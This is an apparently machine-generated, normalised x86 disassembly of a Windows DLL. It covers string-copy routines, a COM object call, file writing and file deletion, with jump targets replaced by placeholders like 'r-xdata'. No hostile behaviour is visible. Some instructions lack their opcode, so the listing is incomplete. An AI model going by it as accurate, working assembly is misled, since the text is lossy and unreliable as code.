jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2b
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc eax
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1005576a
mov [ ebp - 0x6c ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_10023e65
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x60 ]
push eax
call sub_10011224
mov edi [ ebp - 0x54 ]
push [ ebp - 0x6c ]
mov [ edi ] al
movsx eax al
push eax
push r--data
call sub_10079480
add esp 0x14
test eax eax
je r-xdata
mov ecx esi
call sub_10023e65
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
call sub_10006560
mov eax [ ebp - 0x64 ]
push [ ebp - 0x5c ]
add eax 0x1f
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x70 ] eax
call sub_100081b8
test al al
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x54 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x8
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
xor ebx ebx
push ebx
push 0x78
call sub_1003088d
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp edi [ ebp - 0x70 ]
jae r-xdata
cmp [ edi ] 0x30
je r-xdata
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_10041a20
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov eax [ ebp - 0x50 ]
call sub_1004fa89
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
mov edi [ ebp - 0x68 ]
test di di
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] bl
call sub_1005576a
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] di
jne r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_100312a0
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi edx
lea esi [ edi + 0x1c ]
push esi
push r--data
push 0x1
push 0x0
push r--data
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] ecx
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
mov edx 0x3
mov [ ebp - 0x50 ] dx
lea edx [ ebp - 0x28 ]
mov eax 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x48 ] 0x1
call sub_100050e0
mov ebx [ ebp - 0x50 ]
mov ecx [ esi ]
mov edx [ ecx ]
lea eax [ ebp - 0x30 ]
push eax
push 0x0
lea eax [ ebp - 0x28 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x4c ]
mov [ eax + 0x4 ] ebx
mov ebx [ ebp - 0x48 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ebp - 0x44 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] ebx
call ecx
test eax eax
jns r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x3c ]
lea edx [ ebp - 0x30 ]
push edx
mov [ ebp - 0x2c ] 0x0
call sub_1001ee80
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
lea edx [ ebp - 0x34 ]
push edx
mov edx [ ebp - 0x30 ]
xor edi edi
mov [ ebp - 0x34 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
test eax eax
jns r-xdata
mov [ ebp - 0x2c ] 0x3
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x2c ] 0x6
jmp r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
je r-xdata
mov esi [ esi ]
mov eax [ esi ]
mov edx [ eax + 0x88 ]
lea ecx [ ebp - 0x38 ]
push ecx
push esi
call edx
test eax eax
jns r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x34 ] edi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x40 ]
mov edx [ ebp - 0x38 ]
push eax
call sub_1005eea0
mov ecx [ ebp - 0x38 ]
push ecx
call [ SysFreeString@IAT ]
mov [ ebp - 0x2c ] 0x4
jmp r-xdata
sub_10031420
push ebp
mov ebp esp
push 0xffffffff
push sub_100835c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x26c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor edi edi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x278 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x260 ]
push edi
push ecx
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x260 ]
call sub_10048a90
test eax eax
je r-xdata
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x264 ]
cmp esi edi
je r-xdata
or ebx 0xffffffff
mov [ ebp - 0x4 ] ebx
push eax
lea ecx [ ebp - 0x268 ]
mov [ ebp - 0x268 ] edi
mov [ ebp - 0x264 ] edi
call sub_1003b340
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x268 ] edi
jne r-xdata
push 0x1
call sub_10055606
add esp 0x4
push eax
lea ecx [ ebp - 0x270 ]
mov [ ebp - 0x270 ] edi
mov [ ebp - 0x26c ] edi
call sub_100304d0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x270 ] edi
jne r-xdata
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x264 ]
cmp esi edi
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx ebx
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x260 ]
push ecx
lea esi [ ebp - 0x268 ]
call sub_10018d10
test eax eax
je r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x4 ] ebx
call sub_10044190
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax ebx
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] ebx
jne r-xdata
mov esi [ ebp - 0x268 ]
cmp esi edi
jne r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
mov eax esi
mov [ ebp - 0x4 ] ebx
call sub_10044190
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] ebx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ebx esi
call sub_1003ae80
test eax eax
je r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x4 ] ebx
call sub_10044190
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea edx [ ebp - 0x40 ]
mov eax 0x39
call sub_10013830
lea edx [ ebp - 0x1c ]
mov eax 0x125
call sub_10013830
lea edx [ ebp - 0x58 ]
mov eax 0x147
call sub_10013830
lea edx [ ebp - 0x2c ]
mov eax 0x14e
call sub_10013830
mov esi [ esi + 0x12c ]
cmp esi edi
je r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax 0x6
jmp r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
xor eax eax
lea ebx [ ebx ]
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
cmp [ edi + 0x4 ] 0x2
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov eax [ edi + 0x1c ]
mov ebx [ lstrcmpW@IAT ]
lea edx [ ebp - 0x40 ]
push edx
push eax
call ebx
test eax eax
je r-xdata
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x58 ]
push edx
push eax
call ebx
test eax eax
je r-xdata
lea ebx [ ebp - 0x2c ]
call sub_10054fc0
mov eax [ edi + 0x14 ]
lea ecx [ ebp - 0x278 ]
push ecx
lea edx [ ebp - 0x274 ]
push edx
call sub_10015a50
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebp - 0x274 ]
push eax
lea ecx [ ebp - 0x278 ]
mov edx edi
call sub_100084f0
mov ecx [ ebp - 0x274 ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edi [ edi + 0x14 ]
push edi
call [ DeleteFileW@IAT ]
sub_10031770
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
push edi
push 0x80
push 0x2
push edi
push edi
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0x4 ]
push ecx
push edx
push eax
push esi
mov [ ebp - 0x4 ] edi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
lea eax [ edi + 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov edi 0x2
sub_100317d9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003c0f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_100317fa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_1001d849
mov eax esi
jmp r-xdata
sub_100318af
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10005245
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_100318e0
push esi
mov esi ecx
cmp [ esi + 0xb8 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc4 ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0xd8 ]
call eax
mov [ esi + 0xc0 ] 0x0
mov ecx [ esi + 0xd8 ]
push eax
call ecx
mov [ esi + 0xc4 ] 0x0
sub_10031928
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1001d849
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_1003197e
push 0x38
mov eax sub_1007f481
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10030ef2
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10058a63
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_10031a60
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
sub eax esi
sar eax 0x2
cmp eax 0x28
jle r-xdata
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
inc eax
cdq
and edx 0x7
add eax edx
mov edx [ esi ]
sar eax 0x3
lea ecx [ eax * 8 ]
lea ebx [ eax * 4 ]
mov eax [ ebx + esi ]
push edx
push eax
mov [ ebp - 0xc ] ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ ebx ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ esi ] eax
mov edx [ ebx + esi ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + esi ]
push edx
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ ebx + esi ]
mov [ ebx + esi ] ecx
mov [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ edi ] eax
mov eax [ esi ]
mov ecx [ ebx + esi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebx + esi ]
mov eax [ ecx + esi ]
mov [ ecx + esi ] edx
mov [ ebx + esi ] eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ esi ] eax
mov ecx [ edi ]
mov eax edi
sub eax ebx
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ ebx + esi ]
mov [ ebx + esi ] edx
mov [ esi ] eax
mov eax [ edi ]
mov ecx [ ebx + edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ecx ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ edi ]
push ecx
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebx + edi ]
mov [ ebx + edi ] edx
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov ecx eax
sub eax [ ebp - 0xc ]
sub ecx ebx
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
mov eax [ ebp - 0x4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push eax
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov ecx [ eax ]
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov edx [ ebx + esi ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx ]
mov edx [ edx ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ eax ]
push ecx
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx + esi ]
mov eax [ edi ]
mov [ edi ] ecx
mov [ ebx + esi ] eax
mov eax [ ebx + esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ edi ]
mov eax [ ecx ]
mov [ ecx ] edx
mov [ edi ] eax
mov edx [ ebx + esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ebx + esi ] eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10031c71
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_1001d849
mov eax esi
sub_10031cf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081dcf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ edi ] bl
mov edx 0xf
mov [ edi + 0x1c ] edx
mov [ edi + 0x18 ] ebx
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x6c ] ecx
mov [ edi + 0x8 ] bl
mov [ ebp - 0x4 ] ebx
mov [ edi + 0x38 ] edx
mov [ edi + 0x34 ] ebx
mov [ edi + 0x24 ] bl
mov [ edi + 0x40 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ edi + 0x44 ] ebx
mov [ edi + 0x48 ] ecx
mov [ edi + 0x50 ] ebx
mov [ edi + 0x54 ] ebx
mov [ edi + 0x58 ] ebx
mov ecx 0x7
xor edx edx
mov [ edi + 0x74 ] ecx
mov [ edi + 0x70 ] ebx
mov [ edi + 0x60 ] dx
mov [ edi + 0x90 ] ecx
xor ecx ecx
mov [ edi + 0x8c ] ebx
mov [ edi + 0x7c ] cx
mov [ ebp - 0x4 ] 0x4
lea esi [ edi + 0x4 ]
cmp eax ebx
je r-xdata
push esi
call sub_1003b1ca
add esp 0x4
mov [ esi ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x6c ]
call sub_1004a310
xor esi esi
mov [ edi + 0x4c ] eax
cmp [ edi + 0x48 ] ebx
jbe r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx esi
push 0x4
lea esi [ ebp - 0x68 ]
call sub_10041110
add esp 0x4
push eax
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000adb0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x14
jmp r-xdata
mov eax [ edi + 0x48 ]
mov ecx [ edi + 0x40 ]
mov edx [ ebp + 0xc ]
sub eax esi
add ecx esi
cmp eax edx
ja r-xdata
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x28 ] edx
cmp [ ebp + 0x14 ] ebx
je r-xdata
mov edx eax
mov [ ebp - 0x24 ] esi
call sub_1004a310
mov [ ebp - 0x20 ] eax
mov eax [ edi + 0x48 ]
mov [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x4c ]
lea ebx [ edi + 0x50 ]
mov [ ebp - 0x4 ] 0x7
call sub_10044860
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax esi
mov [ ebp - 0x24 ] eax
call sub_1004a310
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
lea ecx [ ebp - 0x4c ]
lea ebx [ edi + 0x50 ]
mov [ ebp - 0x4 ] 0x6
call sub_10044860
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
add esi [ ebp + 0xc ]
cmp esi [ edi + 0x48 ]
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
mov edx [ ebp - 0x48 ]
push edx
jmp r-xdata
xor ebx ebx
call sub_1006591f
add esp 0x4
sub_10031eac
push 0x80
mov eax sub_1007f4fe
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8c ] eax
